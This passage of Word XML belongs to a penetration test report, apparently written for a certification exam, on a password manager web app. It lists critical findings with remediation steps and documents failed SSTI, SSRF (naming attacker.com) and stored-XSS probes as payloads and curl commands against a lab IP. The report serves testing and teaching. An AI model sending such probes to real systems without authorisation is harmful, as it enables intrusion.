        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>-</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>9. Cleartext Password Submission</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>-</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>10. Lack of Input Validation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>-</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>11. Information Disclosure (Error Messages)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>-</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Conclusion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">The FailSafe Password Manager contains </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>4 critical vulnerabilities (75 points)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>multiple reportable weaknesses</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, bringing the total to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>75 points - PASSING SCORE</w:t>
      </w:r>
      <w:r>
        <w:t>. The application's core functionality is severely compromised, allowing attackers to:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Create unauthorized accounts via SQL injection in registration</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Manipulate vault data via SQL injection in vault add</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Modify other users' vault items via IDOR in vault edit</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Maintain persistent access via session fixation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Hijack user accounts via CSRF in account update</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Brute force weak passwords via weak rate limiting</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Immediate Actions Required:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Patch SQL injection in registration and vault add</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Fix IDOR in vault edit endpoint</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Implement proper session management (invalidate old sessions)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Implement CSRF protection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Strengthen rate limiting</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Deploy security headers</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Implement input validation and sanitization</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Overall Risk Rating: HIGH</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Remediation of all critical findings is essential before production deployment. All findings should be addressed within 30 days.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Testing Methodology &amp; Negative Findings</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>During the penetration test, multiple potential vulnerabilities were tested but found not to be exploitable. This section documents the comprehensive testing methodology and demonstrates that security controls are effective against common attack vectors.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1. Server-Side Template Injection (SSTI)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Description:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Attempted to inject template engine payloads to execute server-side code.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Tested Endpoints:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>POST /register (username field)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>POST /vault/add (vaulttitle field)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Payloads Used:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{{7*7}}</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Handlebars/Pug)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;%=7*7%&gt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (EJS)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Testing Method:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -X POST http://10.0.0.10/register \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"username":"{{7*7}}","password":"test123"}'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Results:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Payloads accepted as literal strings</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>No mathematical execution observed</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Application properly sanitizes input and uses JSON responses without template rendering</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Conclusion:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> SSTI not vulnerable ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2. Server-Side Request Forgery (SSRF)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Description:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Attempted to make the application fetch external URLs.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Tested Endpoint:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> GET /share/:key</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Payloads Used:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>http://127.0.0.1:80</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>http://attacker.com</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Testing Method:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl "http://10.0.0.10/share/http://127.0.0.1:80" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Cookie: [session]"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Results:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Response: "Cannot GET /share/http://127.0.0.1:80"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Application does not fetch external resources</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Route does not accept URLs as parameters</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Conclusion:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> SSRF not vulnerable ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3. Authorization Bypass in Share Endpoint</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Description:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Attempted to access shared vault items without proper authorization.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Tested Endpoint:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> GET /share/:key</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Testing Method:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Access share links without authentication</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Access with different user sessions</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Test predictable share keys (1-10)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Results:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Unauthenticated requests: HTTP 401 "Not authenticated"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Wrong user sessions: HTTP 401 "Not authenticated"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Predictable keys: All failed (no valid keys found)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Conclusion:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Authorization properly enforced ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4. File Upload Vulnerabilities</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Description:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Searched for file upload functionality in the application.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Tested Areas:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Vault add endpoint (POST /vault/add)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Account update (POST /account/update)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>UI inspection for file input fields</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Results:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>All endpoints use JSON with text fields only</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>No multipart/form-data requests</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>No file input elements in HTML forms</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Application is password management only</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Conclusion:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> File upload not present - no vulnerabilities possible ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5. Stored XSS in Vault Display</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Description:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Attempted stored XSS via vault item fields displayed in HTML.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Tested Areas:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Vault item creation and display</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Title, username, password fields</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Payloads Used:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;script&gt;alert("XSS")&lt;/script&gt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in title field</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Testing Method:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -X POST http://10.0.0.10/vault/add \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Cookie: [session]" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"vaulttitle":"&lt;script&gt;alert(\"XSS\")&lt;/script&gt;","vaultusername":"test","vaultpassword":"test"}'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Results:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Payload stored and displayed as plain text</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>No JavaScript execution</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Application sanitizes HTML output on display</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Conclusion:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Stored XSS not vulnerable ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Summary of Negative Findings</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Multiple potential vulnerabilities were tested but found not exploitable:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SSTI:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Sanitized input prevents template injection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SSRF:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Share endpoint doesn't fetch external URLs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Auth Bypass:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Proper authentication required for share</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>File Upload:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> No upload functionality exists</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Stored XSS:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Properly sanitized before display</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>These negative findings demonstrate that security controls are effective against common attack vectors beyond the identified critical vulnerabilities.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Report Prepared By:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> TCM Security, Inc.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Date:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> January 18, 2026  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Classification:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Business Confidential</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>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